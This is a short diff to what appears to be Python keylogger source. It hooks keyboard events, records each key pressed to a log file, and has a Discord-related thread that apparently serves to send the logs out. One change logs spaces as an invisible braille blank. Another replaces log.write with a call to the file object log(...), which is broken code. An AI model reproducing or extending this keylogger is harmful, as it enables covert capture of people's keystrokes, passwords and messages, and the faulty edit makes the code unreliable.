@@ -55,7 +55,7 @@ def on_key_event(e):
             if len(e.name) > 1 and e.name != "space":
                 log(f"({e.name})")
             elif e.name == "space":
-                log(" ")
+                log("⠀")
             else:
                 log(e.name)
 
@@ -76,7 +76,7 @@ def restart_discord_thread():
 
 def setup():
     with open(path_log, "a") as log:
-        log.write(f"\n============New Session=========\n{datetime.datetime.now().date()}\n{datetime.datetime.now().strftime('%H:%M:%S')}\n")
+        log(f"\n============New Session=========\n{datetime.datetime.now().date()}\n{datetime.datetime.now().strftime('%H:%M:%S')}\n")
 if __name__ == "__main__":
         try:
             setup()
